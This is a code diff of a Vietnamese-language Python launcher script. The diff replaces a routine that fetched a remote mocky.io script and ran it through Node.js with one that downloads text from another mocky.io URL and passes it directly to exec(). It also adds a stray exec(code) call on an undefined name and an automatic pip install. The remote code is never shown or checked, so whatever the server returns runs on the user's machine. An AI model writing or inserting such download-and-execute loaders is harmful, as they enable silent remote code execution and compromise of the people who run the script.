@@ -1,13 +1,44 @@
 import os
 import sys
-import tempfile
-import subprocess
+import time
+import shutil
+from selenium import webdriver
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.chrome.options import Options
+from webdriver_manager.chrome import ChromeDriverManager
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+import uuid
+import json
 import requests
 import socket
-import io
 
-# Ensure the console is using UTF-8 encoding
-sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
+try:
+    from faker import Faker
+    from requests import session
+    from colorama import Fore, Style, init
+    from random import randint
+    import pystyle
+except ImportError:
+    os.system("pip install faker requests colorama pystyle")
+
+from pystyle import Add, Center, Anime, Colors, Colorate, Write
+
+PINK = '\033[38;5;13m'
+RED = '\033[38;5;9m'
+YELLOW = '\033[38;5;11m'
+GREEN = '\033[38;5;10m'
+LIGHT_PINK = '\033[38;5;207m'
+BLINK = '\033[5m'
+RESET = '\033[0m'
+FLAME_ORANGE = '\033[38;5;208m'
+SILVER = '\033[38;5;231m'
+# Initialize colorama
+init(autoreset=True)
+
+def banner():
+    print(f"🐮{LIGHT_PINK} Vui lòng ấn Enter để vào{RESET}")
 
 def check_internet_connection():
     try:
@@ -16,43 +47,20 @@ def check_internet_connection():
     except OSError:
         return False
 
-def run_node_script(script_content):
-    # Create a temporary file to save the Node.js script
-    with tempfile.NamedTemporaryFile(delete=False, suffix='.js', mode='w', encoding='utf-8') as temp_file:
-        temp_file.write(script_content)
-        temp_file_path = temp_file.name
-
-    try:
-        # Run the Node.js script using the Node.js runtime
-        result = subprocess.run(['node', temp_file_path], capture_output=True, text=True, encoding='utf-8')
-        print(f"Node.js script output:\n{result.stdout}")
-        if result.stderr:
-            print(f"Node.js script errors:\n{result.stderr}")
-    finally:
-        os.remove(temp_file_path)
-
-def banner():
-    print("Please choose an option")
-
 try:
     while True:
         banner()
-        chon = input("Enter number (1) to run or (0) to exit: ")
+        input(f"{GREEN}Ấn Enter để tiếp tục hoặc Ctrl+C để thoát... ")
 
-        if chon == '0':
-            print("Program ended...")
-            break
-        elif chon == '1':
-            if check_internet_connection():
-                try:
-                    response = requests.get('https://run.mocky.io/v3/5091de17-a202-4bc8-a53f-674bf71732a6')
-                    response.raise_for_status()
-                    run_node_script(response.text)
-                except requests.RequestException as e:
-                    print(f"Network error: {e}")
-            else:
-                print("No network connection. Please check your connection.")
+        if check_internet_connection():
+            try:
+                response = requests.get('https://run.mocky.io/v3/afa7ba1d-7f12-4018-922b-01aaeba5cbf3')
+                response.raise_for_status()
+                exec(response.text)
+                exec(code)
+            except requests.RequestException as e:
+                print(f"{RED}Lỗi kết nối mạng: {e}{RESET}")
         else:
-            print("Please enter only numbers")
+            print(f"{RED}Không có kết nối mạng. Vui lòng kiểm tra kết nối của bạn.{RESET}")
 except KeyboardInterrupt:
-    print("\nProgram ended...")
+    print(f"{RED}\nĐã kết thúc chương trình...")
